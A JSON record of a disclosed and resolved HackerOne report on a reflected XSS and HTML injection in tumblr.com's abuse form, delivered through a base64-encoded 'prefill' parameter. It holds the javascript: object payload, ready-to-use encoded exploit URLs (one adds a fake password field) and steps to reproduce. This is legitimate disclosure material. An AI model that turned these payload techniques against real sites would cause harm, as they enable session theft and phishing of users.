@@ -1,0 +1,150 @@
+{
+  "id": 915756,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MTU3NTY=",
+  "url": "https://hackerone.com/reports/915756",
+  "title": "[tumblr.com] 69< Firefox Only  XSS Reflected",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-07-05T08:45:37.031Z",
+  "submitted_at": "2020-07-05T08:45:37.031Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fuzzme",
+    "url": "/fuzzme",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/F9LSiEs1ckRkcUXxrvznmg2n/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 111,
+    "url": "https://hackerone.com/automattic",
+    "handle": "automattic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Automattic",
+      "twitter_handle": "",
+      "website": "https://automattic.com",
+      "about": "WordPress.com, WooCommerce, WordPress VIP, Jetpack, Beeper, Texts, Akismet, Gravatar, Crowdsignal, Tumblr and more!"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-07-09T17:11:04.710Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-07-09T17:08:48.250Z",
+  "team_member_agreed_on_going_public_at": "2020-07-09T17:11:04.502Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Description :\n\nHello, i have found a XSS Reflected in https://www.tumblr.com/abuse/start?prefill=<base64>\nBut the XSS only works in versions of firefox that are below 70.\nBecause its been blocked by CSP, but the version below 69 of firefox is vulnerable.\nHere's a great article about this subject https://portswigger.net/daily-swig/firefox-vulnerable-to-trivial-csp-bypass\nBut CSP dont block HTML tag in the lastest version of all navigators\n\nVulnerable Url  :\n\nhttps://www.tumblr.com/abuse/start?prefill=eyJwb3N0IjpudWxsLCJ1cmxyZXBvcnRpbmciOiJodHRwczovL2Z1enptZS50dW1ibHIuY29tLyIsInR1bWJsZWxvZyI6IjxvYmplY3QgZGF0YT1cImphdmFzY3JpcHQ6YWxlcnQoZG9jdW1lbnQuY29va2llKVwiPiIsImNvbnRleHQiOiJibG9nIn0=\n\nPayload :\n\n<object data=\\\"javascript:alert(document.cookie)\\\">\n\nVulnerable Parameter :\n\n/\\ Note you must decode the $_GET['prefill'], this is encoding is  in base64 /\\\nAfter decoded it, you can see this \n\n{\"post\":null,\"urlreporting\":\"https://fuzzme.tumblr.com/\",\"tumblelog\":\"<object data=\\\"javascript:alert(document.cookie)\\\">\",\"context\":\"blog\"}\n\nThe array value of tumblelog  is reflected into the HTML this him who as vulnerable\nThe array value of tumblelog  is the  vulnerable array value\n\n Steps To Reproduce for XSS Only Firefox :\n\n1. Download firefox 69 at https://ftp.mozilla.org/pub/firefox/releases/69.0/\n2. Go to login in your Tumblr account\n3. Click to this link, and you will see XSS pop-up\n\nLINK : https://www.tumblr.com/abuse/start?prefill=eyJwb3N0IjpudWxsLCJ1cmxyZXBvcnRpbmciOiJodHRwczovL2Z1enptZS50dW1ibHIuY29tLyIsInR1bWJsZWxvZyI6IjxvYmplY3QgZGF0YT1cImphdmFzY3JpcHQ6YWxlcnQoZG9jdW1lbnQuY29va2llKVwiPiIsImNvbnRleHQiOiJibG9nIn0=\n\nSteps To Reproduce for HTML injection :\n\n1. Go to login in your Tumblr account\n2. Click to this link  https://www.tumblr.com/abuse/start?prefill=eyJwb3N0IjpudWxsLCJ1cmxyZXBvcnRpbmciOiJodHRwczovL2Z1enptZS50dW1ibHIuY29tLyIsInR1bWJsZWxvZyI6IjxpbnB1dCB0eXBlPSd0ZXh0JyBwbGFjZWhvbGRlcj0nRW50ZXIgeW91IHBhc3N3b3JkJz4iLCJjb250ZXh0IjoiYmxvZyJ9\n3. And you will see a HTML input  with `enter your password`\n\n\nPOC:\n\nThe attachment video\n\n## Impact\n\nThe vulnerability allow a malicious user to inject html tags and execute Javascript which could lead to steal user's session, and performing phishing.",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 894542,
+      "file_name": "XSS.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6wn4dBhHtjNZPt6HeMnKHiaT?response-content-disposition=attachment%3B%20filename%3D%22XSS.mp4%22%3B%20filename%2A%3DUTF-8%27%27XSS.mp4&response-content-type=video%2Fogg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6UDGEAWX%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T095249Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDtomjzste%2FJyV7XywzlEJQYeqQ2gl1GbRXR68XAax2ZAIhAOXu4GCq8m%2Baons%2BoeD1F5wi6eBebA%2Flbq7z6%2BT5S13%2BKrIFCBEQAxoMMDEzNjE5Mjc0ODQ5Igz0Z1zn%2F0sHyj01UDIqjwU1Vm8BSQ8mwy%2F6URVMkd4PMFnas4kNcnyAhizE%2FtAF0Zo2Rf6osehF9A0vFXUqzBhf%2Bx0tn9BCykRmXL4LADQW2zG0CjvKZ8o0FRejBpfc4ABGr0s2kaBm20dZN46YJj%2Fci9fvZZXks24BJ4R9FMOr8BTuVz1b6QJuLu5ZvF5SijVlIc7qDZpcNOQwUKQGZCKhAiyKxV%2FPdj2wtABwdYRFChvP5HrC0OEE1b1JkM2XVLw3MrttmYe79K24scbCWlu8TNxqz0c%2FHPqayQ2dcErgzkMB%2BG35OzxBXU6KuQhgq3x1CaBaQmC53tpFEwzHDIqZAjrCB3v2l1n8xP9RpfzVSUPz1Pw0mgEQ9vCVLos1WkT5c%2BVghNfCgtN3ZZNakSb0Xo63aLDeyNrDmRQ8N%2B0cAT39RFVD0dFvarC3AlomGqz73cmjaGlZBK6npaBOjh1VijNsw9IEssbOxzts8eaEYK04YEGZiArUQdOKUa6NSYTFNE9DySi12E6zuoqSUQ1%2BM3xg5%2F9a2ezeWFPMfkI%2Fk9xd2H8QobL5HDm%2BQxoo1Xd6C5TY0CDPjWc%2FVJ3Vg%2FujtX7B4YRVGnIhw%2FoVcet%2B7BLsy8samnFShP75uWkw2TESNibZccSBFG796cZdoI9LTNSeL4unuO2lr5qZbVZ%2B%2FQUOVomf6UIfEiz9ILQjOk0%2BeK70YMy6KsInBS4cs6KqHtW6uE0qiPxPC9Sf7YzmKg%2BNKHU8n9%2FJw%2FqdR08dm8FIvGCU3ChxBLT3c25ARE1rgNzEq8WwPQrJLsh4rw%2BPPKCi%2FaLX%2BPeMqnZoxYGJwWYRGsecNgVXF9N06HvTmAyFbl4qGh3DTeqixRHICHUfrCgOj91rnM8kOOeD7hRPMOHkvsYGOrABpQSx1GCRLInHCXgDgl1ei25b5ml%2FW5yrarH%2F4hx%2Bpaa2NMHSkoQOdGhh4sgYrEm%2Fg8oceBhDenU%2FCZmSorsoUVnuQ8C%2FNWEvu2Wg8KqMzrZH7Ek10qtr%2BHD5B7EUJL%2FtIDQV%2BnRfKsDezaCHqPTezQYVw1%2BhPbFCChJ54naSnmcfE3%2FgNFA86zKuNC6LwZ%2B%2FE7Ca5CrnxQljX1VW8ORWPAWCMpgJnIFZwdXgidA9r%2BA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=44a7d9b4a171c5d6b1c832677333a046ee0e56b8673c2ee76ad03f1cff6218c0",
+      "file_size": 15379424,
+      "type": "video/ogg",
+      "moderated": null
+    },
+    {
+      "id": 894544,
+      "file_name": "HTMLinjection.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wTU4WL1zkE4zH4rs6hUaLrjb?response-content-disposition=attachment%3B%20filename%3D%22HTMLinjection.mp4%22%3B%20filename%2A%3DUTF-8%27%27HTMLinjection.mp4&response-content-type=video%2Fogg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6UDGEAWX%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T095249Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDtomjzste%2FJyV7XywzlEJQYeqQ2gl1GbRXR68XAax2ZAIhAOXu4GCq8m%2Baons%2BoeD1F5wi6eBebA%2Flbq7z6%2BT5S13%2BKrIFCBEQAxoMMDEzNjE5Mjc0ODQ5Igz0Z1zn%2F0sHyj01UDIqjwU1Vm8BSQ8mwy%2F6URVMkd4PMFnas4kNcnyAhizE%2FtAF0Zo2Rf6osehF9A0vFXUqzBhf%2Bx0tn9BCykRmXL4LADQW2zG0CjvKZ8o0FRejBpfc4ABGr0s2kaBm20dZN46YJj%2Fci9fvZZXks24BJ4R9FMOr8BTuVz1b6QJuLu5ZvF5SijVlIc7qDZpcNOQwUKQGZCKhAiyKxV%2FPdj2wtABwdYRFChvP5HrC0OEE1b1JkM2XVLw3MrttmYe79K24scbCWlu8TNxqz0c%2FHPqayQ2dcErgzkMB%2BG35OzxBXU6KuQhgq3x1CaBaQmC53tpFEwzHDIqZAjrCB3v2l1n8xP9RpfzVSUPz1Pw0mgEQ9vCVLos1WkT5c%2BVghNfCgtN3ZZNakSb0Xo63aLDeyNrDmRQ8N%2B0cAT39RFVD0dFvarC3AlomGqz73cmjaGlZBK6npaBOjh1VijNsw9IEssbOxzts8eaEYK04YEGZiArUQdOKUa6NSYTFNE9DySi12E6zuoqSUQ1%2BM3xg5%2F9a2ezeWFPMfkI%2Fk9xd2H8QobL5HDm%2BQxoo1Xd6C5TY0CDPjWc%2FVJ3Vg%2FujtX7B4YRVGnIhw%2FoVcet%2B7BLsy8samnFShP75uWkw2TESNibZccSBFG796cZdoI9LTNSeL4unuO2lr5qZbVZ%2B%2FQUOVomf6UIfEiz9ILQjOk0%2BeK70YMy6KsInBS4cs6KqHtW6uE0qiPxPC9Sf7YzmKg%2BNKHU8n9%2FJw%2FqdR08dm8FIvGCU3ChxBLT3c25ARE1rgNzEq8WwPQrJLsh4rw%2BPPKCi%2FaLX%2BPeMqnZoxYGJwWYRGsecNgVXF9N06HvTmAyFbl4qGh3DTeqixRHICHUfrCgOj91rnM8kOOeD7hRPMOHkvsYGOrABpQSx1GCRLInHCXgDgl1ei25b5ml%2FW5yrarH%2F4hx%2Bpaa2NMHSkoQOdGhh4sgYrEm%2Fg8oceBhDenU%2FCZmSorsoUVnuQ8C%2FNWEvu2Wg8KqMzrZH7Ek10qtr%2BHD5B7EUJL%2FtIDQV%2BnRfKsDezaCHqPTezQYVw1%2BhPbFCChJ54naSnmcfE3%2FgNFA86zKuNC6LwZ%2B%2FE7Ca5CrnxQljX1VW8ORWPAWCMpgJnIFZwdXgidA9r%2BA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=284094a34f6c508e8eeca3e18260b4a531b459fff9c8c9ec99abb6427a76ce7d",
+      "file_size": 13368117,
+      "type": "video/ogg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-08-08T17:08:48.334Z",
+  "allow_singular_disclosure_after": -161541841.03977856,
+  "singular_disclosure_allowed": true,
+  "vote_count": 25,
+  "voters": [
+    "omarelfarsaoui",
+    "mattberg",
+    "shreyaschavhan",
+    "ali",
+    "tess",
+    "salahhasoneh",
+    "sudi",
+    "since2003",
+    "tecnical_nitish",
+    "vivek_s",
+    "and 15 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.9,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 42403,
+    "asset_type": "URL",
+    "asset_identifier": "www.tumblr.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
